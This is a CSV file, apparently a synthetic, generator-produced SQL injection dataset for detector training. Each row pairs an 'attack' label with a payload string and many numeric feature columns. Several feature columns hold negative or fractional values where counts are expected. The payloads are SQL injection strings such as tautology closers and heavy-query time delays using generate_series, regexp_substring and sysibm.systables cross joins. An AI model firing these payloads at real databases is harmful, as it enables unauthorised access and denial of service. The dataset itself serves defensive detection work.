id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000485,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,4.399629265947535,118.4470443725586,48.0699462890625,6.930202960968018,33.89927673339844,0.04262356460094452,51.14542007446289,11.663551330566406,0.9979686141014099,0.5078558325767517,0.18678872287273407,0.337453156709671,0.13121075928211212,3.6168646812438965,2.5986578464508057,1.065752387046814,-0.38468748331069946,0.036501411348581314,-0.21992707252502441,0.017796920612454414,1.3655017614364624,1.6406916379928589,2.44083571434021,0.0014569134218618274,1.1509169340133667,0.009050413966178894,-0.02258978597819805,0.021014008671045303,-1.1980266571044922,0.6759844422340393,-0.04932885244488716,0.005097747314721346,0.05092227831482887,0.030742419883608818,0.06488841027021408,0.9885880947113037,4.790401458740234,1.5386097431182861,0.023025333881378174,-0.0014173495583236217,-0.3747595250606537,0.28497663140296936,0.9427725076675415,0.17898060381412506,-0.07419472187757492,-0.33619606494903564,-0.1872069239616394,0.010025270283222198,0.06528591364622116,0.2204701453447342,0.000908620422706008,-0.09299986064434052,0.19862273335456848,-0.3673417270183563,-0.6447820663452148,-0.32501620054244995,0.008093655109405518,0.5997592210769653,0.29280805587768555,0.13498733937740326,-0.0036633284762501717,-0.33020979166030884,-0.005260289181023836,1.0788214206695557,-0.5453155040740967,0.09686034917831421,-0.1574401557445526,0.22420404851436615,0.2824665606021881,0.5176454186439514,-0.11839491128921509,0.0021990109235048294,-0.35889726877212524,0.10211105644702911,-0.6202588081359863,-0.0038631767965853214,1.2741647958755493,0.6801586747169495,-0.0036623775959014893,0.42488372325897217,0.13575246930122375,4.906907558441162,0.9382079839706421,-0.05902840197086334,0.3602237105369568,-0.6067920923233032,-0.04351310059428215,-0.3366595208644867,-0.044771406799554825
GAN_000486,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,4.686104926772356,48.46281433105469,46.1812858581543,0.7418588995933533,10.138744354248047,-0.025395601987838745,43.71989440917969,3.3779444694519043,0.9972289204597473,0.511100172996521,0.1546785980463028,0.30787232518196106,0.13964882493019104,3.8861896991729736,2.4581501483917236,1.0857545137405396,0.3216567635536194,0.04995354264974594,-0.18356408178806305,0.0019247726304456592,-0.2528175413608551,-0.2472623586654663,2.336487293243408,-0.013180340640246868,1.0603693723678589,0.022759968414902687,0.017143625766038895,-0.14036864042282104,-1.0734902620315552,1.000768780708313,-0.047813162207603455,-0.0023582731373608112,-0.012739300727844238,0.36912333965301514,0.34019261598587036,0.8812265396118164,2.823201894760132,1.0669116973876953,-0.07086360454559326,-0.007054103538393974,-0.08952686190605164,0.4947523772716522,1.189526081085205,0.08508826792240143,-0.09379372745752335,-0.40634235739707947,-0.47714918851852417,-0.1765793263912201,0.019584909081459045,0.2723931074142456,0.009934790432453156,-0.1850251406431198,0.03723881021142006,-0.4645650386810303,-0.9636949896812439,-0.5404638648033142,0.00017017456411849707,0.7832543849945068,0.1323866844177246,0.3321574628353119,0.0029534525237977505,-0.2154366374015808,-0.002459227805957198,0.3941801190376282,-0.7623367309570312,0.06568332761526108,-0.17270800471305847,0.4411206841468811,0.23736347258090973,0.5601727366447449,-0.23167608678340912,-0.11972957849502563,-0.05062475800514221,0.08685877919197083,-0.6854195594787598,-0.008293460123240948,1.0975450277328491,0.4720778167247772,-0.008001690730452538,0.3839085102081299,-0.016873158514499664,2.891928195953369,1.0261280536651611,-0.1637469232082367,0.3398169279098511,-0.6595735549926758,0.14837631583213806,-0.03134310618042946,-0.009947281330823898
GAN_000487,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",nearest_attack_euclidean,R001903,10.629260651007977,36.30323028564453,100.50032806396484,-10.27078914642334,-17.692718505859375,0.06161867454648018,99.38314819335938,13.03007984161377,0.9921436905860901,0.9148251414299011,-0.052320629358291626,0.16885685920715332,0.10570092499256134,4.397758960723877,3.7079567909240723,0.9937836527824402,1.0270065069198608,-0.026192892342805862,-0.8134792447090149,-0.1571999192237854,-1.5677794218063354,-5.15185546875,2.6718831062316895,0.007328539155423641,0.9285746216773987,0.07098954916000366,0.10620232671499252,-0.7317655682563782,-2.4920387268066406,2.715420961380005,-0.08548603951931,-0.003710591234266758,-0.10918444395065308,1.3698441982269287,0.8872017860412598,0.48802343010902405,-1.890360713005066,1.33233642578125,0.042421817779541016,-0.011864682659506798,0.30747687816619873,1.3281135559082031,2.1565420627593994,0.43458735942840576,0.37717217206954956,-1.0382057428359985,-1.0621592998504639,-0.7084676027297974,0.018522225320339203,0.6869631409645081,-0.19041508436203003,-0.5191346406936646,0.05164689943194389,-0.9115999341011047,-2.4007561206817627,-1.4189634323120117,0.058194782584905624,2.244264841079712,0.3120613098144531,0.6023821234703064,0.014758401550352573,-0.5259684920310974,-0.004532999359071255,0.2156660556793213,-1.0719457864761353,0.27028846740722656,-0.2072945237159729,0.9354730248451233,-0.25637030601501465,1.086807131767273,-0.7793182730674744,-0.8223214745521545,-0.2231420874595642,0.08417027443647385,-1.7092558145523071,-0.016921527683734894,1.8513274192810059,0.14551714062690735,-0.011462677270174026,0.386353075504303,-0.3508441746234894,1.0873794555664062,1.1437381505966187,-1.2294541597366333,0.6491207480430603,-1.3293087482452393,0.437710165977478,-0.5423378944396973,0.07998527586460114
GAN_000488,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R003119,7.547147862596209,70.77728271484375,61.51443099975586,-9.289483070373535,-5.170864105224609,0.04630887135863304,71.22249603271484,0.21661150455474854,0.9953238368034363,0.7315782308578491,0.07621777057647705,0.27996984124183655,0.11624892801046371,4.0907793045043945,2.8908121585845947,1.6917129755020142,-0.07004362344741821,0.03129366412758827,-0.5246335864067078,-0.06728217005729675,-0.905941367149353,-2.5835437774658203,2.314009666442871,-0.002098285360261798,0.8908761143684387,0.03962933272123337,0.05514764413237572,-0.599362850189209,-2.439117431640625,1.5749833583831787,-0.06270712614059448,0.00397389056161046,-0.23564504086971283,0.41700756549835205,0.27590349316596985,0.43344154953956604,1.3128961324691772,1.3934495449066162,-0.4020766019821167,-0.004060094710439444,-0.20113906264305115,0.7301368117332458,1.5685895681381226,0.3443349003791809,-0.029065966606140137,-0.7152196168899536,-0.6797395348548889,-0.3884299099445343,-0.09522957354784012,0.4855442941188812,-0.10020940750837326,-0.3000338077545166,0.05703543499112129,-0.36196625232696533,-1.68106210231781,-1.0901621580123901,0.00047311701928265393,1.5300426483154297,0.8521966338157654,0.2774145305156708,0.005849701818078756,-0.4111866354942322,-0.007730287965387106,-0.7801917791366577,-1.0059891939163208,0.16175101697444916,-0.25178685784339905,1.0765987634658813,-0.038675881922245026,0.7340644001960754,-0.5254995822906494,-0.11767269670963287,-0.5245651602745056,0.09833735972642899,-1.1721521615982056,-0.010354992002248764,1.4265799522399902,0.4513935148715973,-0.008711478672921658,0.34804007411003113,-0.003406509757041931,1.2964766025543213,1.0441235303878784,-0.7205477952957153,0.5333341360092163,-1.169081687927246,0.3015109896659851,-0.08868121355772018,0.0015507381176576018
GAN_000489,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,4.989008613868174,119.71612548828125,64.37699127197266,2.867649555206299,15.558311462402344,0.07143212854862213,73.38856506347656,12.967680931091309,0.9963390827178955,0.5949631333351135,0.09392362833023071,0.3153952658176422,0.12006492167711258,3.7862191200256348,2.568256378173828,1.6128616333007812,0.3691643476486206,-0.02288362756371498,-0.30127641558647156,-0.05610114708542824,0.08066616207361221,0.9087268114089966,2.1200661659240723,-0.0024083044845610857,1.2810930013656616,0.02467975951731205,0.018566573038697243,-0.11099821329116821,-0.9391335248947144,1.3632678985595703,-0.02853776514530182,0.0028710374608635902,0.0772552564740181,0.39554643630981445,0.31759846210479736,1.0568013191223145,2.1957857608795166,1.6765732765197754,0.14497420191764832,-0.0037955823354423046,-0.11807116866111755,0.5344897508621216,1.1236543655395508,0.5933228731155396,-0.10336270928382874,-0.3920449912548065,-0.290820837020874,-0.17875221371650696,0.014746040105819702,0.30231213569641113,0.023107007145881653,-0.12037542462348938,-0.2363957315683365,-0.3113943338394165,-0.9968098402023315,-0.3341880440711975,0.0151209132745862,0.985675573348999,0.2899926006793976,0.33187371492385864,0.004774638917297125,-0.3563345968723297,-0.002789850113913417,1.2581294775009155,-0.5013929605484009,0.10998095571994781,-0.11162853240966797,0.5021762251853943,-0.06904194504022598,0.5502083897590637,-0.09597845375537872,-0.30726194381713867,-0.2401103377342224,0.10779022425413132,-0.8634284734725952,-0.006337011698633432,1.4691611528396606,0.5217190384864807,-0.006308716256171465,0.27512428164482117,0.016712605953216553,3.296868324279785,0.9331860542297363,-0.4597637951374054,0.4396817684173584,-0.5373849868774414,0.06687133014202118,-0.3350031077861786,0.006609561387449503
GAN_000490,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,6.720952328413028,68.16326904296875,58.628292083740234,-1.5466963052749634,4.3329620361328125,-0.019007081165909767,54.7155876159668,2.8331141471862793,0.9954584240913391,0.5903717875480652,0.15935152769088745,0.27102193236351013,0.1266494244337082,3.8718838691711426,2.8120391368865967,1.1073391437530518,0.242792546749115,0.05415509641170502,-0.40420001745224,-0.01312557514756918,-0.7505840063095093,-1.5458568334579468,2.155317783355713,-0.004586152732372284,0.965798556804657,0.03536117449402809,0.007567930035293102,-0.5495888590812683,-1.196226954460144,1.3074980974197388,-0.06366115808486938,0.002193208783864975,-0.13618463277816772,0.49944257736206055,0.22905594110488892,0.5173071622848511,2.442164897918701,1.14800226688385,-0.4494750499725342,-0.0030561303719878197,-0.19890770316123962,0.5972163677215576,1.666503667831421,0.3734157085418701,0.0904916375875473,-0.6652753353118896,-0.20087024569511414,-0.3064746856689453,-0.06088503450155258,0.41019004583358765,-0.09342630952596664,-0.20415140688419342,0.4217972159385681,-0.44880038499832153,-1.6812975406646729,-0.6014351844787598,0.01987561769783497,1.397587537765503,0.47404050827026367,0.1590716689825058,0.0015891329385340214,-0.5008552670478821,-0.0037682210095226765,1.2067011594772339,-1.0553021430969238,0.12067489326000214,-0.2123757302761078,0.7453110814094543,0.08996245265007019,0.7935513257980347,-0.4872554540634155,-0.2611512541770935,-0.32844242453575134,0.1450948268175125,-1.1680103540420532,-0.005238340236246586,1.3490920066833496,0.30442699790000916,-0.011453406885266304,0.4843253195285797,0.27163636684417725,2.293947458267212,1.0321967601776123,-0.4829399883747101,0.4720385670661926,-0.9918256998062134,0.18784916400909424,-0.21105022728443146,-0.01537508238106966
GAN_000491,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,5.841849103851735,151.391357421875,23.167997360229492,16.658605575561523,54.03944778442383,-0.010959232226014137,17.41449546813965,11.195056915283203,0.9998782277107239,0.22910617291927338,0.31538844108581543,0.43521443009376526,0.1310928612947464,3.0174570083618164,3.522185802459717,1.82755708694458,-1.071432113647461,-0.13953784108161926,0.24470292031764984,0.02986091747879982,4.279165267944336,3.855412006378174,2.221175193786621,0.008961006999015808,1.0729353427886963,-0.011212656274437904,-0.08513166755437851,-0.09098747372627258,0.10232700407505035,-0.29158613085746765,-0.07464948296546936,0.009460083208978176,0.18732963502407074,-0.47102952003479004,-0.4811471700668335,1.1557706594467163,6.990712642669678,2.3027377128601074,-0.27461713552474976,-0.016110330820083618,-0.5501521229743958,-0.5192764401435852,0.7759149670600891,-0.07718349993228912,-0.3085549473762512,-0.04520176351070404,0.13119499385356903,0.3990630805492401,0.4149831235408783,0.17242790758609772,0.029324650764465332,0.10323091596364975,0.060724254697561264,0.03734630346298218,-0.6349977254867554,0.5729235410690308,0.008975004777312279,0.08345990628004074,-0.20616059005260468,0.33729901909828186,-0.007892314344644547,0.33878904581069946,-0.012137901037931442,0.053203217685222626,-0.2501077950000763,0.09385941177606583,-0.16172847151756287,-0.3421783447265625,0.8207048177719116,0.338542103767395,-0.28167349100112915,-0.011825568974018097,-0.24922239780426025,0.03426897153258324,-0.24975906312465668,-0.0036856275983154774,1.2682650089263916,0.7252886295318604,0.003634905908256769,0.39719632267951965,-0.10448610782623291,4.834835529327393,1.0221996307373047,0.6730771064758301,0.4618756175041199,-0.2680712342262268,-0.043027956038713455,-0.8173032402992249,-0.08157850056886673
GAN_000492,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.057578836873933,304.0576477050781,57.62236785888672,34.057701110839844,113.76713562011719,0.08576112240552902,67.71408081054688,41.52570343017578,0.9998811483383179,0.3298790454864502,0.23682694137096405,0.4546997547149658,0.1019459143280983,2.833272933959961,3.655120849609375,1.3094133138656616,-0.8518933653831482,-0.22461377084255219,-0.05370209738612175,0.025390397757291794,10.877458572387695,6.332857608795166,1.9595544338226318,0.010470759123563766,1.7809923887252808,-0.0003133694117423147,-0.06216379627585411,-0.1861402690410614,-0.4605841636657715,0.38184821605682373,-0.04200410097837448,0.008774387650191784,0.21717724204063416,-0.6546818017959595,-0.4644702672958374,1.7004590034484863,6.679564952850342,3.0495259761810303,0.05950397253036499,-0.00984375923871994,0.06961585581302643,-0.24760326743125916,0.3287065923213959,0.3044397830963135,0.5098707675933838,0.10338327288627625,0.5617043375968933,0.672660768032074,0.47776851058006287,0.3937419056892395,0.09854160994291306,0.2889866530895233,0.16023479402065277,0.36016565561294556,-0.6755297183990479,0.4739362597465515,0.04276502877473831,0.17707587778568268,0.10137443989515305,0.21724730730056763,-0.011680087074637413,0.6991675496101379,-0.015807896852493286,2.4825398921966553,-0.19533975422382355,0.23542648553848267,-0.03811116889119148,0.1277075707912445,0.5342028141021729,-0.08700158447027206,-0.1715773493051529,-0.053464487195014954,-0.41141948103904724,0.058578506112098694,-0.30810967087745667,-0.004796305205672979,1.6423825025558472,0.405760258436203,0.00023329805117100477,-0.08549026399850845,-0.006604790687561035,7.883235931396484,0.9588366150856018,0.49954789876937866,0.38906753063201904,-0.2538481652736664,-0.3862488865852356,-0.8182833790779114,-0.02522430010139942
GAN_000493,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko",nearest_attack_euclidean,R000502,4.63733675245022,225.00335693359375,62.023033142089844,26.930456161499023,76.33403778076172,0.059783611446619034,73.79562377929688,36.50926208496094,0.9976103901863098,0.3829312026500702,0.1269674301147461,0.3530702590942383,0.11923055350780487,3.349127769470215,2.645526170730591,0.5364680886268616,0.8294680118560791,-0.13214588165283203,-0.18267440795898438,-0.02260502614080906,6.355867862701416,5.624873161315918,1.7293623685836792,0.02027396485209465,1.73275887966156,0.01938028447329998,-0.004284048918634653,0.017225001007318497,0.3346997797489166,1.0340032577514648,-0.03308180347084999,-8.019585948204622e-05,0.2515951097011566,0.02481444738805294,0.22917507588863373,1.6564104557037354,3.808842420578003,2.0185587406158447,0.38393518328666687,-0.006339484825730324,0.5024421811103821,0.4832859933376312,0.5186207890510559,0.26719599962234497,0.39013954997062683,0.10132347047328949,0.1658547967672348,0.2667660415172577,0.2956204116344452,0.3361835181713104,0.09553175419569016,0.11077525466680527,0.058353815227746964,0.01960853487253189,-0.5294583439826965,-0.032991886138916016,0.03556611016392708,0.463733971118927,0.1741851270198822,0.1180284172296524,-0.002721981378272176,0.013731978833675385,-0.004570990800857544,2.5327951908111572,-0.25023317337036133,0.12907510995864868,0.0050828284583985806,0.053976669907569885,0.10140512138605118,0.038795579224824905,-0.15536177158355713,-0.20253390073776245,-0.1196153536438942,0.04671480134129524,-0.583245575428009,-0.0025447881780564785,1.459571361541748,0.2605302333831787,-0.00269381795078516,0.003305339952930808,0.024701319634914398,6.55450963973999,0.90523362159729,-0.07336920499801636,0.2590269148349762,-0.4429628252983093,-0.17026196420192719,-0.41543594002723694,0.03756656125187874
GAN_000494,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.40547701503226,332.46929931640625,75.85671997070312,37.89707946777344,109.37144470214844,0.07003071904182434,92.78704833984375,49.265174865722656,0.9970569014549255,0.438739150762558,0.13177549839019775,0.4020412564277649,0.09005387872457504,2.965080499649048,4.460849761962891,0.8416864275932312,-0.1713048815727234,-0.2588512897491455,-0.3841763138771057,-0.029057687148451805,11.68694019317627,6.119156360626221,1.6812970638275146,0.029994122684001923,1.906901478767395,0.02658504620194435,-0.02598322369158268,-0.5211327075958252,-0.46113789081573486,1.179842233657837,-0.06203758344054222,0.0067020137794315815,0.1769315004348755,-0.15955528616905212,-0.29099059104919434,1.6247973442077637,4.571460723876953,3.25321364402771,0.06288057565689087,-0.007070573046803474,0.5106145739555359,0.2514597475528717,0.5061848163604736,0.6285418272018433,0.8201170563697815,-0.0646105408668518,0.5156735181808472,0.5721314549446106,0.43533554673194885,0.6439963579177856,0.10966543108224869,0.27343958616256714,0.14101152122020721,0.3463565707206726,-1.1186223030090332,0.04411200433969498,0.04699290543794632,0.7752218246459961,0.4393796920776367,0.1948678195476532,-0.0120243476703763,0.6679524779319763,-0.015616459771990776,3.539159059524536,-0.5277380347251892,0.2957644760608673,-0.03702212870121002,0.5219985246658325,0.29596465826034546,0.014414817094802856,-0.44481736421585083,-0.4972257614135742,-0.26224061846733093,0.08810234814882278,-0.8205469250679016,-0.004923224914819002,1.8113893270492554,-0.01638847403228283,-0.006464595906436443,-0.2553579807281494,0.05700138211250305,7.308826923370361,0.9889868497848511,0.012202486395835876,0.334270179271698,-0.8594709038734436,-0.3483428955078125,-0.8301857709884644,0.03999890014529228
